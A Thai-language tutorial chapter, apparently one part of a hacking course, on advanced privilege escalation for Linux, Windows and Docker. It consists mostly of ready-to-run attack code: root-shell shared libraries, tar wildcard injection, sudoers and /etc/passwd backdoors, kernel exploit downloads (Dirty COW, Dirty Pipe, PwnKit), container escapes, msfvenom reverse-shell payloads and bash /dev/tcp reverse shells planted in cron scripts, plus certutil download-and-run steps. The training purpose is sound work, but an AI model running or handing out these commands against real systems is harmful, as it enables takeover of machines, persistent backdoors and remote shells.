# Part 54: Advanced Privilege Escalation (การยกระดับสิทธิ์ขั้นสูง)

## สารบัญ
1. [Linux Privilege Escalation ขั้นสูง](#1-linux-privilege-escalation)
2. [Windows Privilege Escalation ขั้นสูง](#2-windows-privilege-escalation)
3. [Sudo และ SUID/SGID Abuse](#3-sudo-และ-suidsgid-abuse)
4. [Kernel Exploits](#4-kernel-exploits)
5. [Service และ Cron Job Abuse](#5-service-และ-cron-job-abuse)
6. [Docker และ Container Escape](#6-docker-และ-container-escape)
7. [Token Impersonation (Windows)](#7-token-impersonation-windows)
8. [Automated PrivEsc Tools](#8-automated-privesc-tools)
9. [แบบฝึกหัด Lab](#9-แบบฝึกหัด-lab)

---

## 1. Linux Privilege Escalation

### 1.1 การตรวจสอบอัตโนมัติ

```bash
# ตรวจสอบ System Info
uname -a                    # OS version
lsb_release -a              # Distribution info
cat /proc/version           # Kernel version
arch                        # Architecture
cat /etc/issue              # OS info

# ตรวจสอบ ผู้ใช้งาน ปัจจุบัน
whoami
id
groups
cat /etc/passwd | grep -v nologin
cat /etc/group

# ตรวจสอบ sudo สิทธิ์
sudo -l
sudo -l -U username
cat /etc/sudoers 2>/dev/null

# ตรวจสอบ SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# ตรวจสอบ SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# ตรวจสอบ writable directories และ files
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# ตรวจสอบ cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# ตรวจสอบ services
ps aux
systemctl list-units --type=service
/sbin/service --status-all
ss -tlnp
netstat -tlnp

# ตรวจสอบ environment variables
env
set
cat /proc/1/environ
```

### 1.2 Sensitive Files

```bash
# ค้นหา password files
cat /etc/passwd
cat /etc/shadow   # ต้องเป็น root
grep -l 'password\|passwd\|secret\|key' /etc/* 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat ~/.ssh/authorized_keys
ls -la ~/.ssh/

# ดู bash history
cat ~/.bash_history
cat ~/.zsh_history
history

# Config files ที่อาจมี credentials
find / -name "*.conf" 2>/dev/null | xargs grep -l 'password\|passwd\|secret' 2>/dev/null
find / -name "wp-config.php" 2>/dev/null  # WordPress
find / -name ".env" 2>/dev/null
find / -name "config.php" 2>/dev/null

# ดู mail
ls /var/mail/
cat /var/mail/$USER
```

### 1.3 Path Hijacking

```bash
# ถ้า SUID binary เรียก command โดยไม่ใช้ absolute path
# เราสามารถโกง PATH environment variable ได้

# เช่น: SUID binary เรียก 'service apache2 start'
# อ่าน binary strings เพื่อดูว่าเรียกอะไร
strings /usr/local/bin/suid_binary | grep -E '^[a-z]+$'

# สร้าง malicious 'service' command
mkdir /tmp/exploit_path
cat > /tmp/exploit_path/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/exploit_path/service

# แก้ไข PATH
export PATH=/tmp/exploit_path:$PATH

# เรียก SUID binary
/usr/local/bin/suid_binary
# -> เรียก /tmp/exploit_path/service (malicious) แทน
```

### 1.4 Wildcard Injection

```bash
# ถ้า cron job ใช้ tar กับ wildcard:
# * /root cd /var/backups && tar -zcf /tmp/backup.tgz *

# สร้าง malicious files ที่ทำหน้าที่เป็น tar options
cd /var/backups  # directory ที่ tar ทำงาน

# สร้าง shell script สำหรับ rootshell
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /var/backups/shell.sh
chmod +x /var/backups/shell.sh

# สร้าง files ที่ทำหน้าที่เป็น tar arguments
touch '/var/backups/--checkpoint=1'
touch '/var/backups/--checkpoint-action=exec=sh shell.sh'

# รอ cron job ทำงาน...
# เมื่อมี /tmp/rootbash
/tmp/rootbash -p  # ได้ root shell
```

### 1.5 Shared Library Hijacking

```bash
# หา binaries ที่ load shared libraries
# ใช้ LD_PRELOAD ถ้า sudo อนุญาต

# 1. LD_PRELOAD (sudo -l เห็น env_keep += LD_PRELOAD)
# สร้าง malicious shared library
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# เรียก sudo ด้วย LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so apache2

# 2. LD_LIBRARY_PATH
# หา libraries ที่ binary ใช้
ldd /usr/bin/suid_app

# สร้าง malicious library ที่ชื่อเดียวกัน
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

void custom_function() __attribute__((constructor));

void custom_function() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -o /tmp/libcustom.so -shared -fPIC /tmp/libcustom.c

export LD_LIBRARY_PATH=/tmp
/usr/bin/suid_app
```

---

## 2. Windows Privilege Escalation

### 2.1 การตรวจสอบ Windows

```cmd
REM ตรวจสอบ System Info
systeminfo
hostname
whoami /all
net user %username%
net localgroup
net localgroup Administrators

REM ตรวจสอบ Privileges
whoami /priv

REM ตรวจสอบ Services
wmic service list brief
sc query type= all state= all
tasklist /SVC

REM ตรวจสอบ Scheduled Tasks
schtasks /query /fo LIST /v

REM ตรวจสอบ Registry สำหรับ Autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REM ตรวจสอบ Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"

REM ตรวจสอบ Weak Permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "Authenticated Users" *

REM ตรวจสอบ DLL Hijacking
Process Monitor (ProcMon) -> filter: Result = NAME NOT FOUND, Path ends with .dll
```

### 2.2 Unquoted Service Path

```cmd
REM หา Unquoted Service Path
wmic service get name,displayname,pathname,startmode ^
    | findstr /i /v "C:\\Windows\\system32\\"

REM ตัวอย่าง: Service path = C:\Program Files\My Service\service.exe
REM Windows จะลอง :
REM 1. C:\Program.exe
REM 2. C:\Program Files\My.exe
REM 3. C:\Program Files\My Service\service.exe

REM สร้าง malicious binary
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > "C:\Program Files\My.exe"

REM restart service
sc stop VulnService
sc start VulnService

REM หรือ restart คอมพิวเตอร์
shutdown /r /t 0
```

### 2.3 AlwaysInstallElevated

```cmd
REM ตรวจสอบ
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM ถ้าทั้งสองเป็น 0x1 = vulnerable!
```

```bash
# สร้าง malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f msi > evil.msi

# ติดตั้ง
msiexec /quiet /qn /i evil.msi
```

---

## 3. Sudo และ SUID/SGID Abuse

### 3.1 Sudo GTFOBins

```bash
# ดูว่า sudo -l อนุญาต binary ไหนบ้าง
sudo -l

# ===== Common GTFOBins =====

# vim
sudo vim -c ':!/bin/bash'

# nano
sudo nano
# Ctrl+R Ctrl+X -> reset; sh 1>&0 2>&0

# less
sudo less /etc/passwd
# !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python3 -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# find
sudo find / -exec /bin/bash \;
# หรือ
sudo find . -name anything -exec /bin/bash \;

# man
sudo man man
# !/bin/bash

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# nmap (versions < 5.20)
sudo nmap --interactive
nmap> !sh

# cp
sudo cp /bin/bash /tmp/rootbash
sudo chmod +s /tmp/rootbash
/tmp/rootbash -p

# tee (overwrite files)
echo "username ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/backdoor
```

### 3.2 SUID Exploitation

```bash
# หา SUID binaries
find / -perm -u=s -type f 2>/dev/null

# ตรวจสอปใน GTFOBins
# https://gtfobins.github.io/ -> search binary name

# ===== ตัวอย่าง SUID binaries =====

# bash (SUID)
/bin/bash -p  # -p = preserve euid

# cp (SUID)
# คัดลอก /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 hacked):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd
su hacker  # password: hacked

# python3 (SUID)
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl (SUID)
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'

# nmap (SUID)
nmap --interactive
nmap> !sh

# pkexec (CVE-2021-4034 - PwnKit)
# EDB-ID: 50689
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit
chmod +x /tmp/PwnKit
/tmp/PwnKit

# screen (SUID) - CVE-2017-5618
# GNU Screen 4.5.0
# Exploit creates root shell
```

### 3.3 Capabilities Abuse

```bash
# ตรวจสอบ capabilities
getcap -r / 2>/dev/null

# ตัวอย่าง:
# /usr/bin/python3.8 = cap_setuid+ep

# CAP_SETUID สามารถ setuid(0)
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_NET_RAW สามารถ sniff traffic
python3 -c '
import socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x800))
while True:
    data = s.recv(65535)
    print(data)
'

# CAP_DAC_READ_SEARCH สามารถอ่าน any file
python3 -c 'open("/etc/shadow").read()'

# เพิ่ม capability แบบถาวร (sudo หรือ root)
setcap cap_setuid+ep /usr/bin/python3
```

---

## 4. Kernel Exploits

### 4.1 Dirty COW (CVE-2016-5195)

```bash
# ตรวจสอบ kernel version
uname -r
# Vulnerable: 2.6.22 - 4.8.3

# Exploit: เขียนไปยัง read-only memory ผ่าน race condition
# ดาวน์โหลด exploit
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
gcc -pthread pokemon.c -o pokemon -lcrypt
./pokemon  # สร้าง firefart user ที่มี uid=0
su firefart  # password: pokemon

# DirtyCOW SUID (dcow)
wget https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
./dcow -s  # spawn root shell
```

### 4.2 หา Kernel Exploit ที่เหมาะสม

```bash
# ตรวจสอบ kernel version
uname -r

# ค้นหา exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# ใช้ LES (Linux Exploit Suggester)
curl -fsSL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o /tmp/les.sh
bash /tmp/les.sh

# ใช้ linux-smart-enumeration
curl -fsSL https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh -o /tmp/lse.sh
bash /tmp/lse.sh -l2

# ===== Common Kernel CVEs =====
# CVE-2017-16995 (eBPF) - kernel 4.4 - 4.14
# CVE-2019-13272 (ptrace) - kernel < 5.1.17
# CVE-2021-3493 (overlayfs) - Ubuntu kernels
# CVE-2022-0847 (Dirty Pipe) - kernel 5.8 - 5.16.10
```

### 4.3 Dirty Pipe (CVE-2022-0847)

```bash
# ตรวจสอบ: kernel 5.8 - 5.16.10
uname -r

# Dirty Pipe: เขียนไปยัง read-only files (rw- r-- r--)
# เช่น /etc/passwd แม้ว่าจะเป็น read-only

# Exploit script
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o dirtypipe
./dirtypipe /etc/passwd  # overwrite /etc/passwd

# หรือใช้แบบ SUID shell
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
gcc exploit-2.c -o dirtypipe2
./dirtypipe2 /usr/bin/sudo  # SUID binary ใดก็ได้
```

---

## 5. Service และ Cron Job Abuse

### 5.1 Cron Job Abuse

```bash
# สึกสาว cron jobs ที่รัน ด้วย root
cat /etc/crontab

# ตัวอย่าง:
# */5 * * * * root /usr/local/bin/backup.sh

# ตรวจสอบ permissions ของ script
ls -la /usr/local/bin/backup.sh
# -rwxrwxrw-  -> Everyone can write!

# เขียน reverse shell เข้าไป
cat > /usr/local/bin/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
EOF
chmod +x /usr/local/bin/backup.sh

# รอ reverse shell
nc -lvnp 4444
```

### 5.2 ติดตาม Cron Jobs ด้วย pspy

```bash
# pspy: monitor processes โดยไม่ต้อง root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# ดูผล:
# 2024/01/01 12:00:01 CMD: UID=0 PID=1234 | /bin/sh /usr/local/bin/backup.sh
# UID=0 = root กำลังเรียก

# ใช้ watch แบบง่ายๆ
watch -n 1 "ps aux | grep root"
```

### 5.3 Weak Service Permissions (Windows)

```cmd
REM ตรวจสอบ permissions ของ service
accesschk.exe -ucqv VulnService

REM ถ้ามี SERVICE_ALL_ACCESS สำหรับ Users
sc config VulnService binpath= "cmd.exe /c net localgroup administrators hacker /add"
sc stop VulnService
sc start VulnService

REM หรือใช้ PowerShell
Set-ServiceObjectSecurity -Name VulnService -SecurityDescriptorSddl "D:(A;;CCLCSWLOCRRC;;;AU)..."
```

---

## 6. Docker และ Container Escape

### 6.1 Docker Socket Abuse

```bash
# ตรวจสอบว่าอยู่ใน container หรือเปล่า
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep docker
cat /proc/self/cgroup | head -5

# ตรวจสอบ Docker socket
ls -la /var/run/docker.sock
# -rw-r--rw- -> writable by others!

# Mount host filesystem ผ่าน Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# เมื่อเข้าไปแล้ว /mnt คือ host filesystem

# หรือใช้ curl
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H 'Content-Type: application/json' \
    -d '{"Image": "alpine", "Cmd": ["/bin/sh"], "Binds": ["/:/mnt"], "Privileged": true}' \
    http://localhost/containers/create
```

### 6.2 Privileged Container Escape

```bash
# ตรวจสอบ --privileged flag
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff -> privileged!

# Mount host device
mkdir /mnt/host
fdisk -l  # ดู disk partitions
mount /dev/sda1 /mnt/host  # mount host disk
chroot /mnt/host  # chroot เข้าไป host

# หรือใช้ cgroup escape
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # เห็น host processes
```

### 6.3 Container Escape via Kernel Vulnerability

```bash
# Runc CVE-2019-5736 (ยังรับ Docker < 18.09.2)

# ถ้า attacker สามารถ exec เข้าไปใน container ที่ถูก control
# สามารถ overwrite runc binary บน host

# ตรวจสอบ Docker version
docker version

# ใช้ exploit script
git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
cd CVE-2019-5736-PoC
# แก้ไข payload ใน main.go
go build main.go
./main
```

---

## 7. Token Impersonation (Windows)

### 7.1 SeImpersonatePrivilege

```powershell
# ตรวจสอบ privileges
whoami /priv
# ถ้าเห็น SeImpersonatePrivilege = Enabled
# สามารถใช้ Potato attacks ได้!

# JuicyPotato (Windows Server 2019 และเก่ากว่า)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# สร้าง reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
certutil -urlcache -f http://10.10.10.1/shell.exe C:\Windows\Temp\shell.exe
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t *
```

### 7.2 PrintSpoofer

```powershell
# PrintSpoofer สำหรับ Windows 10 / Server 2016-2019
# ต้องการ: SeImpersonatePrivilege

# ดาวน์โหลด
certutil -urlcache -f http://10.10.10.1/PrintSpoofer64.exe C:\Temp\spoofer.exe

# เรียกใช้
C:\Temp\spoofer.exe -i -c cmd  # spawn interactive cmd as SYSTEM
C:\Temp\spoofer.exe -c "C:\Temp\shell.exe"  # execute reverse shell
```

### 7.3 Mimikatz Token Impersonation

```cmd
REM เปิด Mimikatz
mimikatz.exe

REM ดู processes
token::list

REM Impersonate token ของ Domain Admin
token::elevate /domainadmin

REM หรือ impersonate process specific
token::impersonate /processid:1234

REM ตรวจสอบ
whoami
```

---

## 8. Automated PrivEsc Tools

### 8.1 Linux Enumeration Tools

```bash
# LinPEAS
curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# หรือ
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
bash linpeas.sh | tee /tmp/linpeas_output.txt

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
bash LinEnum.sh -t

# linux-smart-enumeration (lse)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
bash lse.sh -l 2

# Linux Exploit Suggester 2
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

### 8.2 Windows Enumeration Tools

```powershell
# WinPEAS
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe' -OutFile 'C:\Temp\winpeas.exe'
C:\Temp\winpeas.exe

# PowerUp.ps1 (PowerSploit)
Import-Module PowerUp.ps1
Invoke-AllChecks

# JAWS
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

# Sherlock (patching info)
Import-Module Sherlock.ps1
Find-AllVulns

# Seatbelt
Seatbelt.exe all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

### 8.3 สร้าง Custom Privesc Script

```bash
#!/bin/bash
# quick_privesc_check.sh

echo "====== Quick PrivEsc Check ======"
echo "[*] Current user: $(whoami)"
echo "[*] Groups: $(groups)"
echo ""

echo "=== SUDO ==="
sudo -l 2>/dev/null

echo ""
echo "=== SUID ==="
find / -perm -u=s -type f 2>/dev/null

echo ""
echo "=== SGID ==="
find / -perm -g=s -type f 2>/dev/null

echo ""
echo "=== CAPABILITIES ==="
getcap -r / 2>/dev/null

echo ""
echo "=== WRITABLE /etc ==="
find /etc -writable 2>/dev/null

echo ""
echo "=== CRON JOBS ==="
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null

echo ""
echo "=== PATH WRITABLE ==="
for dir in $(echo $PATH | tr ':' ' '); do
    if [ -w "$dir" ]; then
        echo "[!] WRITABLE: $dir"
    fi
done

echo ""
echo "=== SENSITIVE FILES ==="
[ -r /etc/shadow ] && echo "[!] /etc/shadow readable!"
[ -r /etc/passwd ] && echo "[+] /etc/passwd readable"
find /home -name "*.ssh" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

echo "====== Done ======"
```

---

## 9. แบบฝึกหัด Lab

### Lab 1: Linux PrivEsc Chain

```bash
# เซ็ตอัพ vulnerable machine (เช่น TryHackMe: Linux PrivEsc)
# 1. เริ่มจาก low privilege user

# Step 1: Enumerate
bash linpeas.sh > /tmp/results.txt

# Step 2: ตรวจสอบ sudo -l
sudo -l
# User www-data may run the following commands:
#     (root) NOPASSWD: /usr/bin/python3

# Step 3: Exploit sudo python3
sudo python3 -c 'import os; os.system("/bin/bash")

# Step 4: ยืนยัน root
whoami  # root
```

### Lab 2: SUID Path Hijacking

```bash
# หา SUID binary ที่ vulnerable
find / -perm -u=s -type f 2>/dev/null
# /usr/local/bin/suid_finder

# วิเคราะห์ binary
strings /usr/local/bin/suid_finder
# ...find / -name...
# เรียก 'find' โดยไม่ใช้ absolute path!

# Exploit PATH hijacking
mkdir /tmp/exploit
cat > /tmp/exploit/find << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/exploit/find
export PATH=/tmp/exploit:$PATH
/usr/local/bin/suid_finder  # spawn root shell
```

### Lab 3: Cron Job Exploitation

```bash
# ตรวจสอบ cron
cat /etc/crontab
# */1 * * * * root /opt/monitoring.sh

# ตรวจสอบ permissions
ls -la /opt/monitoring.sh
# -rwxrwxrwx = world writable!

# Inject reverse shell
echo '#!/bin/bash' > /opt/monitoring.sh
echo 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> /opt/monitoring.sh

# ตั้ง listener และรอ 1 นาที
# nc -lvnp 4444
```

### สรุป PrivEsc Techniques

| เทคนิค | OS | อุปกรณ์ |
|--------|-----|------|
| Sudo GTFOBins | Linux | GTFOBins.github.io |
| SUID Abuse | Linux | find + strings |
| Cron Job Abuse | Linux | crontab, pspy |
| PATH Hijacking | Linux | strings, export PATH |
| Capabilities | Linux | getcap |
| Docker Socket | Linux | docker socket |
| Unquoted Service Path | Windows | accesschk, sc |
| Token Impersonation | Windows | JuicyPotato, PrintSpoofer |
| AlwaysInstallElevated | Windows | reg query |
| DLL Hijacking | Windows | ProcMon |

---

← [Part 53: Exploit Development](Part-53-Exploit-Development.md) | [Part 55: Container Security](Part-55-Container-Security.md) →
